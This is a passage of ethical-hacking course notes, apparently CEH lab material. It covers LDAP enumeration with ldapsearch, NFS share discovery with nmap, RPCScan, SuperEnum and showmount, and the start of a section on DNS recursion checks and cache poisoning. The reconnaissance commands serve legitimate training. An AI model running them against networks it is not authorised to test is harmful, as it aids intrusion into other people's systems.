itself.</li></ul><ul id="ae346306-65fd-4862-9948-2d9f6144a617" class="bulleted-list"><li style="list-style-type:disc"><strong>sub</strong>: Search the base object and all its subordinates.</li></ul></details></li></ul><ul id="81c35593-92aa-4329-8159-794674cb634d" class="toggle"><li><details open=""><summary><code>objectClass =&lt;type&gt;</code> Speficies the type of objects to return</summary><ul id="fd89c94a-e723-4370-95da-035b1288f4ee" class="bulleted-list"><li style="list-style-type:disc"><strong>top</strong>: The root object class from which all other object classes inherit (like a folder).</li></ul><ul id="5e884ba2-44c2-4ea4-b6da-f5bfea9d5097" class="bulleted-list"><li style="list-style-type:disc"><strong>person</strong>: Represents an individual person.</li></ul><ul id="fd9b6afe-f744-4f0a-b5ec-528daf196ac2" class="bulleted-list"><li style="list-style-type:disc"><strong>organizationalPerson</strong>: Extends <code>person</code> with organizational information.</li></ul><ul id="322e68b4-b9e8-4242-bce0-1ad77a99f3bc" class="bulleted-list"><li style="list-style-type:disc"><strong>inetOrgPerson</strong>: Extends <code>organizationalPerson</code>; commonly used for people entries.</li></ul><ul id="ecbc104d-dfcd-41e6-b055-6016bca15f9c" class="bulleted-list"><li style="list-style-type:disc"><strong>organizationalUnit</strong>: Represents an organizational unit or department.</li></ul><ul id="dfdd9c5e-db7e-45cc-9b9a-f2c7674dd28b" class="bulleted-list"><li style="list-style-type:disc"><strong>groupOfNames</strong>: Represents a group of named objects (e.g., a group of users).</li></ul><ul id="bb496af9-2913-4249-9698-95923bb76ab3" class="bulleted-list"><li style="list-style-type:disc"><strong>groupOfUniqueNames</strong>: Similar to <code>groupOfNames</code>, but ensures unique members.</li></ul><ul id="7bc4259a-d591-4efa-b88b-56b93b077406" class="bulleted-list"><li style="list-style-type:disc"><strong>domain</strong>: Represents a DNS domain.</li></ul><ul id="e18a58de-e4c2-4b1a-8998-72c365bf9a5d" class="bulleted-list"><li style="list-style-type:disc"><strong>posixAccount</strong>: Represents a POSIX user account (used in UNIX/Linux).</li></ul><ul id="a61ece66-0262-461c-b63b-a75baa5a780a" class="bulleted-list"><li style="list-style-type:disc"><strong>posixGroup</strong>: Represents a POSIX group (used in UNIX/Linux).</li></ul><ul id="c4f46a67-a305-4479-9dc1-4125899eaab7" class="bulleted-list"><li style="list-style-type:disc"><strong>shadowAccount</strong>: Represents shadow password information for a POSIX account.</li></ul><ul id="3201f7b5-27a5-4ee8-836a-5c3e9a448544" class="bulleted-list"><li style="list-style-type:disc"><strong>account</strong>: Represents a generic account object.</li></ul></details></li></ul><ul id="d269d492-9c85-4685-a3cc-7ef1927ed83c" class="toggle"><li><details open=""><summary>Identify specific only attributes you want to receive</summary><p id="7890efc9-e1a5-49ef-b57f-630cdabcce27" class="">When results are given, you get alot of attributes for each object</p><p id="f85e21d0-762c-44b4-876f-b5c8350ef66b" class="">If you want to filter only needed attributes, type their name at the end of the command, eg.:</p><ul id="f16fb8df-82ab-4445-99d3-d20cd5f13c4b" class="bulleted-list"><li style="list-style-type:disc"><code>ldapsearch -x -h &lt;server-ip&gt; -b &quot;dc=CEH,dc=com&quot; -s sub &quot;(objectClass=*)&quot; </code><code><strong>cn</strong></code></li></ul><ul id="55df6427-9d0d-4226-868a-44d68d850da6" class="bulleted-list"><li style="list-style-type:disc"><code>ldapsearch -h [Target IP Address] -x -s base</code><code><strong> namingcontexts</strong></code></li></ul></details></li></ul><p id="3e5ad0c6-6fd6-4583-9bff-e10aa3c373b0" class="">
</p></details></li></ul><ul id="bd3e92fd-c7ab-4617-ab73-15b517b8c65f" class="bulleted-list"><li style="list-style-type:disc"><code>ldapsearch -h 10.10.1.22 -x -s base</code><ul id="26008c59-8e13-4f1e-b846-2f7dbd1b4384" class="bulleted-list"><li style="list-style-type:circle"><code>-h</code> specify host</li></ul><ul id="538a4aa2-8c9e-403e-9619-edcbcdddc1f8" class="bulleted-list"><li style="list-style-type:circle"><code>-x</code> specify simple authentication mode (no encryption or other authorization method)</li></ul><ul id="973e9a09-12a8-4a2a-ae49-2488ada96d7b" class="bulleted-list"><li style="list-style-type:circle"><code>-s base</code> specify what to get out of the search</li></ul></li></ul><ul id="82c00267-0789-4fb2-9bd1-a6ab450766c4" class="bulleted-list"><li style="list-style-type:disc"><code>ldapsearch -h 10.10.1.22 -x -b &quot;DC=CEH,DC=com&quot;</code><ul id="d50211b1-7ad6-47f8-8fff-30e0fd1112df" class="bulleted-list"><li style="list-style-type:circle"><code>-h</code> specify host</li></ul><ul id="6bb1dfb3-5863-4bf0-a4c5-1b0e14eae551" class="bulleted-list"><li style="list-style-type:circle"><code>-x</code> specify simple auth mode</li></ul><ul id="4aea7238-d64c-49ad-9b60-0975dee5daaa" class="bulleted-list"><li style="list-style-type:circle"><code>-b</code> set a search starting point (not root)</li></ul></li></ul><ul id="d31b3ec6-2890-4a37-832b-e70507557900" class="bulleted-list"><li style="list-style-type:disc"><code>ldapsearch -x -h 10.10.1.22 -b &quot;DC=CEH,DC=com&quot; &quot;objectClass=top&quot;</code><ul id="bf0e99d2-9163-4b8f-a347-92acd96edb85" class="bulleted-list"><li style="list-style-type:circle"><code>-h</code> specify host</li></ul><ul id="d838d39a-2a42-4b52-8dc1-4b84b238474c" class="bulleted-list"><li style="list-style-type:circle"><code>-x</code> specify simple authentication mode (no encryption or other authorization method)</li></ul><ul id="db22947e-c7a8-445c-ab63-3971965907bf" class="bulleted-list"><li style="list-style-type:circle"><code>-b</code> set a search starting point (not root)</li></ul><ul id="0f3583ba-fdca-4b50-a3b8-72d40ebd6dae" class="bulleted-list"><li style="list-style-type:circle"><code>objectClass=top</code> set objectClass as the parent class that others inhearit <ul id="3659c483-d966-41a9-940a-f22c56eb8158" class="bulleted-list"><li style="list-style-type:square">if not speficied or an asterisk (*) is used, any object class will be returned</li></ul></li></ul></li></ul><ul id="dce1c9d4-4398-48ff-9cd3-f7763a0dc858" class="bulleted-list"><li style="list-style-type:disc"><code>ldapsearch -x -H ldap://&lt;target -b &quot;DC=CEH,DC=com&quot; &quot;objectclass=person&quot; displayName</code><ul id="cbff9d93-3245-49f7-aa02-14559180b223" class="bulleted-list"><li style="list-style-type:circle">find user objects in CEH.com organisaiton</li></ul><ul id="49ca652d-0dc5-44f9-bf1c-577af7a38cd8" class="bulleted-list"><li style="list-style-type:circle">and filter  by display name</li></ul></li></ul></details></li></ul><p id="6050f400-b4d7-49b4-af7f-8a6f19b946ec" class="">
</p><ul id="dfc43d04-268a-4476-8975-d051c1093aa1" class="toggle"><li><details open=""><summary>Other Tools:</summary><ul id="49997393-b494-429a-9a1c-054705385994" class="bulleted-list"><li style="list-style-type:disc">Softerra LDAP Administraotr (ldapadministrator.com)</li></ul><ul id="374d5a54-0593-433d-93ce-17408671d86e" class="bulleted-list"><li style="list-style-type:disc">LDAP Admin Tool (ldapsoft.com)</li></ul><ul id="c5b719c1-b269-4caa-893e-61bad3918186" class="bulleted-list"><li style="list-style-type:disc">LDAP Account Manager (ldap-account-manager.org)</li></ul><ul id="21402b71-b587-4902-9c3d-da0ff7c7089d" class="bulleted-list"><li style="list-style-type:disc">LDAP Search (securityxploded.com)</li></ul></details></li></ul><p id="41bc5214-97b5-4338-b6db-b0b38fa0880b" class="">
</p><p id="cbc42651-f428-424a-a94f-7fea55d2177a" class="">
</p><p id="c6cc6353-6bbb-4dc0-8e24-2d44d9d9ca34" class="">
</p><p id="4b69bcc5-aedd-46e6-8df7-1bf90c7da931" class="">
</p></details></li></ul><ul id="68256f44-37fd-4e8f-9aee-5fcfbe5e5373" class="toggle"><li><details open=""><summary>NFS Enumeration</summary><p id="f0747b92-30dd-4fac-a494-dae194268f23" class="">Its the next step after LDAP enumeration to identify<div class="indented"><ul id="c203f1e8-55cc-42f3-9bef-aaa66503d9f5" class="bulleted-list"><li style="list-style-type:disc">directories</li></ul><ul id="e9ab9c07-7467-4b3b-8ea2-ce8523ef60da" class="bulleted-list"><li style="list-style-type:disc">users connected</li></ul><ul id="a2f29c8f-e17e-4563-8813-d23edbd1a994" class="bulleted-list"><li style="list-style-type:disc">ip addresses</li></ul><ul id="8b243c52-3199-4434-8dd8-f6153609525c" class="bulleted-list"><li style="list-style-type:disc">shared data associated with users</li></ul></div></p><p id="c9844072-b273-49fd-8f48-b64168ec4fe8" class="">NFS (Network File System) is a type of file system that enables computer users to access, view, store, and update files over a remote server.</p><p id="780afecf-e8a7-4e17-bd5f-e552468dd90b" class="">This remote data can be accessed by the client computer in the same way that it is accessed on the local system.</p><p id="4dc51a72-7989-4ae4-a129-30842bb9b723" class="">Once available shares are found, we might be able to mount them and extract information</p><ul id="61e65ed1-3129-407b-a38f-5110c898d975" class="toggle"><li><details open=""><summary>NFS Ports 2049/111 TCP</summary><h3 id="6066c9f5-107e-4e16-9c19-2be8d93ddd7c" class="">Default Ports for NFS</h3><ol type="1" id="3e16a14a-2f49-46c9-a4e8-e842fe3a65e7" class="numbered-list" start="1"><li><strong>Port 2049</strong>:<ul id="fed92c4b-bebe-4107-b295-01e48473a763" class="bulleted-list"><li style="list-style-type:disc"><strong>NFS Server</strong>: This is the primary port used by the NFS server for both TCP and UDP protocols. It is used for the NFS protocol itself.</li></ul></li></ol><ol type="1" id="e9ebc170-603b-4631-b5f8-3119b98a04e4" class="numbered-list" start="2"><li><strong>Port 111</strong>:<ul id="34ee2996-23ca-411b-a81f-ae8b86c5ed0a" class="bulleted-list"><li style="list-style-type:disc"><strong>Portmapper/RPCbind</strong>: NFS relies on the Portmapper (or RPCbind) service, which uses port 111. This service helps clients to discover which ports are used by various NFS services.</li></ul></li></ol><h3 id="2dafbea3-4803-4a62-b0cf-cc3a45e77139" class="">Additional Ports for NFS Services</h3><ol type="1" id="32c89444-cda0-4c49-b6c2-0781fad5e0b5" class="numbered-list" start="1"><li><strong>Mountd</strong>:<ul id="9566fafe-662a-4267-8975-415a49043c76" class="bulleted-list"><li style="list-style-type:disc"><strong>Port</strong>: This service usually runs on a dynamic port assigned by the Portmapper, but it can be configured to use a static port.</li></ul><ul id="8841b5da-19e5-43ff-8068-26dddfdd148d" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: The mountd service handles mount requests from NFS clients.</li></ul></li></ol><ol type="1" id="fa12f7ed-3b25-4df1-82ea-36de74b68b0b" class="numbered-list" start="2"><li><strong>Nlockmgr (Network Lock Manager)</strong>:<ul id="f48ad0fe-7714-400a-a402-6732b56ad332" class="bulleted-list"><li style="list-style-type:disc"><strong>Port</strong>: This service typically uses dynamic ports, but like mountd, it can be configured to use a static port.</li></ul><ul id="1cc8b4a5-2d3c-407d-a00e-aa49df0b9f36" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: The nlockmgr service provides file locking support to NFS clients.</li></ul></li></ol><ol type="1" id="1cb9a99c-de6c-445a-a3e5-57c459791dc2" class="numbered-list" start="3"><li><strong>Statd (Network Status Monitor)</strong>:<ul id="6f950bfd-ad2e-4fe6-ad53-5788eae62155" class="bulleted-list"><li style="list-style-type:disc"><strong>Port</strong>: Also uses dynamic ports by default but can be configured to use static ports.</li></ul><ul id="55e7e0a4-90e8-43d9-8e06-b153d302f1cf" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: The statd service monitors the status of network nodes and handles crash recovery.</li></ul></li></ol></details></li></ul><ul id="4fd2c63a-adcb-44c9-8e28-be7c638bc219" class="toggle"><li><details open=""><summary>Interaction between NFS and RPC</summary><p id="32775a10-13db-4a6b-b79f-fee5d03d593a" class=""><strong>RPC:</strong> allows a program to execute code on a remote server as if it were a local procedure call.</p><h3 id="b40a9bbf-b3f4-42fc-95ce-c466920be2a1" class="">How RPC and NFS are Related</h3><ol type="1" id="e3fe12b5-7bc8-4925-a778-fe4fa2c15a6d" class="numbered-list" start="1"><li><strong>Service Discovery</strong>: NFS relies on RPC to manage service discovery and communication. NFS services use RPC to register themselves with the Portmapper (or rpcbind in newer systems).</li></ol><ol type="1" id="0da29da8-b960-4057-b6ed-9042b2b85bbf" class="numbered-list" start="2"><li><strong>Portmapper</strong>: The Portmapper service, which typically runs on port 111, maps RPC program numbers to network port numbers. When an NFS client wants to communicate with an NFS server, it first contacts the Portmapper to determine which ports the NFS services are running on.</li></ol><ol type="1" id="66b8313f-7feb-48f7-8893-a3dc3a3facf2" class="numbered-list" start="3"><li><strong>RPC Calls in NFS</strong>: Various NFS operations (such as mounting a filesystem, reading, writing, etc.) are implemented as RPC calls. These calls allow the client to interact with the remote filesystem as if it were local.</li></ol></details></li></ul><ul id="fb69c204-2f07-483b-b1e0-9033935afd7f" class="toggle"><li><details open=""><summary>Why Portmapper exists and how it interacts with NFS and RPC</summary><ol type="1" id="cbe2b909-d218-4865-bed3-730a13958259" class="numbered-list" start="1"><li><strong>Service Registration</strong>:<ul id="bdac2e19-90ac-4d8c-9e1c-bcc412df9bcd" class="bulleted-list"><li style="list-style-type:disc">When an RPC service (such as NFS) starts, it registers itself with the Portmapper. It informs the Portmapper of its program number, version, protocol (TCP/UDP), and the port it is listening on.</li></ul><h3 id="11eca529-58f2-4b5d-bb87-c550eba8293b" class="">Example:</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bd0e1297-adf3-4970-8287-7523e175d763" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">NFS -&gt; Portmapper: Register Program 100003, Version 3, Protocol TCP, Port 2049</code></pre></li></ol><ol type="1" id="214d98ff-f959-4ced-9f99-edb551fbebd0" class="numbered-list" start="2"><li><strong>Client Query</strong>:<ul id="965df658-f2cf-4ad8-ac38-8bd1449f8274" class="bulleted-list"><li style="list-style-type:disc">When a client wants to use an RPC service, it first queries the Portmapper to find out which port the desired service is using. The client sends a request to the Portmapper on port 111 with the program number and version of the service it wants to use.</li></ul><h3 id="ecce5974-e9ff-4fa4-9e1f-a904ec50f828" class="">Example:</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0befe339-e1af-432a-ac56-48d79e61556c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Client -&gt; Portmapper: What port is Program 100003, Version 3 using?</code></pre></li></ol><ol type="1" id="2375bc59-d267-4550-a5b8-c73819e1871d" class="numbered-list" start="3"><li><strong>Portmapper Response</strong>:<ul id="8ae5b361-20e1-40eb-89fe-a062fbad6f56" class="bulleted-list"><li style="list-style-type:disc">The Portmapper responds with the port number where the service is listening.</li></ul><h3 id="2ee33fa5-28c8-4db4-bfbd-05b3988b8aa9" class="">Example:</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="af6764d6-a2b9-4ef1-8e09-e316bf7fb7c0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Portmapper -&gt; Client: Program 100003, Version 3 is using port 2049.</code></pre></li></ol><ol type="1" id="bef6e2ee-3904-4817-9f57-37b31a25863c" class="numbered-list" start="4"><li><strong>Client Communication</strong>:<ul id="7b725dac-07a8-42a2-a2f0-a3b3af1bb9c8" class="bulleted-list"><li style="list-style-type:disc">With the port number obtained from the Portmapper, the client can now send RPC requests directly to the service on the specified port.</li></ul><h3 id="9c93c0e6-f6f3-4a6a-8c01-d027126b38d6" class="">Example:</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5d65fdab-1f71-46a6-8204-67e00e4094b2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Client -&gt; NFS (Port 2049): RPC Call (e.g., read file)</code></pre></li></ol><h3 id="e2065ff8-8c03-4c45-b184-fc1166c04a0c" class="">Why Portmapper is Necessary</h3><ol type="1" id="fe5a0489-fcc7-45cb-85f6-512e5bd2477f" class="numbered-list" start="1"><li><strong>Dynamic Port Allocation</strong>:<ul id="a02c9ada-87c6-47b8-a617-49ffa60768d9" class="bulleted-list"><li style="list-style-type:disc">RPC services can dynamically choose available ports when they start. The Portmapper keeps track of these dynamic assignments, ensuring that clients can always find the services they need.</li></ul></li></ol><ol type="1" id="e14b28f8-bdf3-42eb-b2a7-cf2bbfd14fad" class="numbered-list" start="2"><li><strong>Service Discovery</strong>:<ul id="8ec468d4-ac87-46d0-a94c-83073b54cf27" class="bulleted-list"><li style="list-style-type:disc">The Portmapper provides a central registry that clients can query to discover the ports used by various RPC services, facilitating easy and flexible service discovery.</li></ul></li></ol><ol type="1" id="96a07a8d-1e21-4691-8fcf-9f290d52c102" class="numbered-list" start="3"><li><strong>Standard Mechanism</strong>:<ul id="5a013d5f-7c95-4503-9984-59d5b97199ed" class="bulleted-list"><li style="list-style-type:disc">The use of the Portmapper is part of the standard RPC protocol, providing a consistent method for service registration and discovery across different systems and environments.</li></ul></li></ol></details></li></ul><ul id="3d5ba7dc-05a3-4a8e-ab74-8f423a1c3f71" class="toggle"><li><details open=""><summary>Lab Instructions</summary><ul id="8eecb276-b611-4847-9c99-ee6ffebf29ad" class="bulleted-list"><li style="list-style-type:disc">We needed to add NFS on windows server 2019</li></ul><ul id="fe6c3bd0-45da-4f33-8548-1de9c595a513" class="bulleted-list"><li style="list-style-type:disc"><code>Add roles or features</code></li></ul><ul id="0ffe4c8d-d67f-4cc5-bebe-13dc5d179ee0" class="bulleted-list"><li style="list-style-type:disc">File and Storage Services → File and iSCSI Services → Server for NFS</li></ul><ul id="a79d3d86-2647-45bd-9f54-5b45d0875d44" class="bulleted-list"><li style="list-style-type:disc"><code>Install</code></li></ul></details></li></ul><p id="d1901b10-7a0e-4890-a184-7b763bd69e8d" class="">
</p><ul id="3f5efbc3-01c2-4269-93b5-8d55606065e8" class="toggle"><li><details open=""><summary>Using Nmap to scan</summary><ul id="edbd0ec9-5d3f-42cd-b821-942119a4b7e3" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -p 2049 &lt;target&gt;</code></li></ul><ul id="ad5a6554-aa4b-4b89-b461-945c632d6124" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -p 111 &lt;target&gt;</code></li></ul><p id="a28feb18-32f0-41d4-9ff6-0cfb745f1353" class="">
</p></details></li></ul><ul id="2a48555e-35e6-44aa-816a-9ed53ee6d024" class="toggle"><li><details open=""><summary>Using RPCScan</summary><ul id="bfa923b8-d87b-45a8-b57f-d6cdf5679200" class="bulleted-list"><li style="list-style-type:disc"><code>cd RPCScan</code></li></ul><ul id="62050b30-f970-42c4-ae8b-b6837c5d298e" class="bulleted-list"><li style="list-style-type:disc"><code>python3 rpc-scan.py &lt;target &gt; -- rpc</code></li></ul><ul id="f2ad731b-dde6-4295-9aec-10f5cd360864" class="bulleted-list"><li style="list-style-type:disc">Displays ports running on system and programs running on it</li></ul><ul id="c80f8191-d6f8-4a0f-a63c-c1bc570504ef" class="bulleted-list"><li style="list-style-type:disc">This is because portmapper shows available programs and their ports when scanned, so it is scanned for every program (they have known numbers for each service they provide)</li></ul></details></li></ul><ul id="1461a4b9-65e1-4294-94a3-652d0b0a95e8" class="toggle"><li><details open=""><summary>Using SuperEnum</summary><p id="cb645a1c-b6f6-4f9c-95df-8e7d2abca388" class="">Shows various open ports for NFS and services running on them</p><p id="b07ebd82-baa9-49da-9159-2d5b5172b537" class="">Uses multiple tools to scan, mostly nmap scans (commands are in config file)</p><p id="b389409c-da32-494b-ac6d-9fe0017ae7d0" class="">
</p><ul id="0fa42513-1315-438d-a3cc-552483cb473e" class="bulleted-list"><li style="list-style-type:disc"><code>cd SuperEnum</code></li></ul><ul id="008fa724-2d6f-497f-8387-1ece7b1efb80" class="bulleted-list"><li style="list-style-type:disc"><code>echo &quot;10.10.1.19&quot; &gt;&gt; Target.txt</code></li></ul><ul id="ccde3b62-b587-439b-bb21-48ae3f6c106f" class="bulleted-list"><li style="list-style-type:disc"><code>./superenum</code></li></ul><ul id="4496af70-0dda-4b7a-9e0d-b9f195cf2feb" class="bulleted-list"><li style="list-style-type:disc">Enter <code>Target.txt</code></li></ul><p id="5ee4cea3-d10e-45ee-b2be-f93c58f7516a" class="">
</p></details></li></ul><ul id="0ca6e034-8df8-454e-bffe-50db7848d828" class="toggle"><li><details open=""><summary>Using showmount</summary><p id="9767709d-f3a3-4640-a34d-f5d9916c6e70" class="">To view a list of shared files and directories</p><ul id="0499f618-161c-4fe2-9fbb-31a10373bae2" class="bulleted-list"><li style="list-style-type:disc"><code>showmount -e &lt;target&gt;</code></li></ul></details></li></ul><ul id="52c5a457-7f21-49ab-b208-04d9ba6f4f9a" class="toggle"><li><details open=""><summary>Using Nmap scripts</summary><ul id="05b61b27-6dfb-4b55-86b5-4ae974027235" class="bulleted-list"><li style="list-style-type:disc"><code>nfs-ls </code>List NFS exports and check permissions</li></ul><ul id="40a4d840-c1b3-49fb-a2f7-38d846ab5cfa" class="bulleted-list"><li style="list-style-type:disc"><code>nfs-showmount</code> Like showmount -e</li></ul><ul id="9ff159a5-1e33-48ee-ad4a-f3993b61bf16" class="bulleted-list"><li style="list-style-type:disc"><code>nfs-statfs</code> Disk statistics and info from NFS share</li></ul></details></li></ul></details></li></ul><ul id="0d2208de-bb5d-4954-a38e-ea624c9656d2" class="toggle"><li><details open=""><summary>DNS Enumeration</summary><p id="06eccdd6-ea46-49c3-a340-a1dd2b51a56c" class="">Its the next step after NFS enumeration</p><p id="01f5166f-8523-41c8-897a-cc463ece26f8" class="">This process yields information such as DNS server names, hostnames, machine names, usernames, IP addresses, and aliases</p><ul id="f7017337-1e1a-4287-b7b4-7106017b543c" class="toggle"><li><details open=""><summary>Runs on both TCP and UDP port 53 (also 853,443)</summary><ul id="b42eb4ca-57cb-4aee-ba21-e9ceaf48334c" class="toggle"><li><details open=""><summary><strong>UDP Port 53</strong>:</summary><ul id="cc1866d5-6316-4d92-8ebe-7b97e81f29dd" class="bulleted-list"><li style="list-style-type:disc"><strong>Usage</strong>: Most DNS queries and responses use UDP because it is faster and has less overhead compared to TCP.</li></ul><ul id="d8f69f67-dc12-4886-993f-374822d516bb" class="bulleted-list"><li style="list-style-type:disc"><strong>Packet Size</strong>: DNS over UDP is generally used for packet sizes up to 512 bytes. If the response data exceeds this size, the server may respond with a truncated message, indicating that the client should retry using TCP.</li></ul><ul id="9d5a5c01-0428-4c32-85ce-096beb40a56c" class="bulleted-list"><li style="list-style-type:disc"><strong>Typical Use Cases</strong>: Standard DNS lookups (A records, AAAA records, MX records, etc.)</li></ul></details></li></ul><ul id="1e98b585-87d7-4bbc-8ad7-353fbd234f40" class="toggle"><li><details open=""><summary><strong>TCP Port 53</strong>:</summary><ul id="cfe3c877-f3cb-4357-a79b-15fd94a32a14" class="bulleted-list"><li style="list-style-type:disc"><strong>Usage</strong>: DNS uses TCP for tasks that require reliable delivery, such as zone transfers (AXFR/IXFR) between DNS servers, and for responses that exceed the UDP size limit.</li></ul><ul id="8d714105-8c98-4adb-8e0e-3d312c4602bb" class="bulleted-list"><li style="list-style-type:disc"><strong>Packet Size</strong>: TCP handles larger DNS messages that cannot be accommodated by UDP.</li></ul><ul id="f955ed40-4a5d-4dd7-84e2-6fc4b889be25" class="bulleted-list"><li style="list-style-type:disc"><strong>Typical Use Cases</strong>: Zone transfers, DNSSEC (DNS Security Extensions) data retrieval, and responses to queries that are too large for UDP.</li></ul></details></li></ul><ul id="bd8de0fb-8df8-4fc7-b0c4-f38d16013832" class="toggle"><li><details open=""><summary><strong>Port 853</strong>:</summary><ul id="747d9d95-3519-46fe-849b-7474deaada18" class="bulleted-list"><li style="list-style-type:disc"><strong>Usage</strong>: DNS over TLS (DoT).</li></ul><ul id="eb25badd-ba8d-473c-95e5-08e8ec8f0692" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: Provides encrypted DNS queries to enhance privacy and security by preventing eavesdropping and tampering.</li></ul></details></li></ul><ul id="815021cd-0cae-44e1-8648-282600823918" class="toggle"><li><details open=""><summary><strong>Port 443</strong>:</summary><ul id="af51b5a2-2e7f-49f9-95c6-fd026e93dc9a" class="bulleted-list"><li style="list-style-type:disc"><strong>Usage</strong>: DNS over HTTPS (DoH).</li></ul><ul id="7f86525f-3c23-4f46-9c29-267c34bdff19" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: Encrypts DNS queries using the HTTPS protocol, further enhancing privacy and security.</li></ul></details></li></ul></details></li></ul><ul id="5b2d3642-b917-46b9-b004-96618079f730" class="toggle"><li><details open=""><summary>DNS Cache Poisoning Research</summary><p id="93629f48-6109-4ed6-b594-40646267d09a" class="">DNS cache poisoning is an attack where a malicious actor inserts forged DNS responses into the cache of a DNS resolver as its trying to recursively respond to a query. </p><p id="118e1a8e-8db1-4d35-b8e9-62a611080d16" class="">This misleads users trying to access legitimate websites, redirecting them to malicious sites instead.</p><ul id="4231f6d3-6c3e-44c7-b7f1-2f926774bb67" class="toggle"><li><details open=""><summary>Identifying DNS Recursive Query Capability</summary><p id="bf9421c3-8b8d-4408-a29d-35b61a8ed1c6" class="">An ethical hacker can determine whether a DNS server allows recursive queries by sending a query for a domain that the server is not authoritative for. If the server responds with an answer (rather than a referral), it indicates that the server is configured to allow recursive queries.</p><h3 id="96732260-72b8-44b4-b585-7c78187e9311" class="">Tools and Methods</h3><ol type="1" id="817dbbe1-0050-4d8c-8441-bebaac53e0c4" class="numbered-list" start="1"><li><strong>Using </strong><code><strong>dig</strong></code><strong> Command</strong></li></ol><p id="2a84a3c8-6933-4140-a429-f0c022d157c1" class="">The <code>dig</code> command can be used to query the DNS server and check for recursive capabilities.</p><h3 id="bf8b639d-8fa6-4be8-8ac8-b522e7712bab" class="">Example Command:</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="66037b40-1031-493c-8680-f2c130485cc6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">dig @&lt;dns-server-ip&gt; www.example.com</code></pre><ul id="6d6b23d6-293f-47ff-a760-3242e2146f07" class="bulleted-list"><li style="list-style-type:disc"><strong>Analysis</strong>:<ul id="f8847147-0ecf-4026-9f3b-971db2a471a4" class="bulleted-list"><li style="list-style-type:circle">If the DNS server is not authoritative for <code>example.com</code> but returns an answer, it indicates that the server is performing recursion.</li></ul></li></ul><h3 id="943829f0-7e65-4455-9766-86f5bf1cba19" class="">Detailed Steps:</h3><ol type="1" id="695cc5d8-14c5-4af3-a8ec-23441c73ecdd" class="numbered-list" start="1"><li><strong>Query the DNS Server</strong>:<ul id="894aef54-6b84-4179-8e25-0b381680bd61" class="bulleted-list"><li style="list-style-type:disc">Send a query to the DNS server for a domain it is not authoritative for.</li></ul><ul id="da1aff33-430a-4e7c-bdd2-212f2796bb7a" class="bulleted-list"><li style="list-style-type:disc">Example:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" 